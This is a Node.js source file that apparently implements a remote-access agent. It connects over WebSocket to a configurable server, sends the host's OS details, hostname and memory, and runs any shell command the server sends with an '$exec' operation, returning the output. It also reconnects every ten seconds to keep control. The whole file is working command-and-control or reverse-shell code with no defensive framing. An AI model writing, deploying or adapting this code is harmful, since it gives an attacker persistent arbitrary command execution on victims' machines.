const WS = require('ws')
const os = require('os');
const { exec } = require('child_process')
let ws = new WS("ws://127.0.0.1:9000") // by default it will connect to localhost, change to server DNS name or domain name. Also change the port
let connected = 0
let reconnect_time = 10000

function connect() {
    connected += 1
    ws = new WS("ws://127.0.0.1:9000")
    ws.on("open", () => {
        console.log("Connection establised")
        if (connected < 2) {
            sendSystemInfo()
        }
        ws.on("message", (message) => {
            const msg = message.toString()
            const [client, operation, ...text] = msg.split(" ")
            if (operation === "$exec") { // checks if there is exec command to execute the cmd.
                cmd(text.join(" "))
            }
            else if (operation === "$reconnect") {
                reconnect()
            }
            else if(operation === "$systemInfo") {
                sendSystemInfo()
            }
        })
    })


    ws.on("error", (error) => {
        console.log("error")
        connected = 0
        setTimeout(reconnect, 2000)
    })
    ws.on("close", () => {
        console.log("Connection Closed")
    })

}

function cmd(cmd) {
    try {
        exec(cmd, (err, stdout, stderr) => {
            if (err) {
                ws.send(`ERORR ::: ${err}`)
                return
            } else if (stderr) {
                ws.send(`STDERR ::: ${stderr}`)
                return
            }
            ws.send(stdout)
        })
    } catch {
        console.log(`Something Went Wrong with exec cmd.`)
    }
}


function sendSystemInfo() {
    ws.send(`Connected to OS :: ${os.type()}`)
    ws.send(`OS Platform :: ${os.platform()}`)
    ws.send(`OS Architcture :: ${os.arch()}`)
    ws.send(`OS Release :: ${os.release()}`)
    ws.send(`OS Hostname :: ${os.hostname()}`)
    ws.send(`OS Up Time :: ${os.uptime()}`)
    ws.send(`OS Load Avg.:: ${os.loadavg()}`)
    ws.send(`OS Memory :: ${os.totalmem()}`)
    ws.send(`OS Free Memory:: ${os.freemem()}`)
}


function reconnect() {
    try {
        ws.close()
        connect()
    } catch {
        console.log("Some Error in reconnection")
    }
}
reconnect()
setInterval(reconnect, reconnect_time)
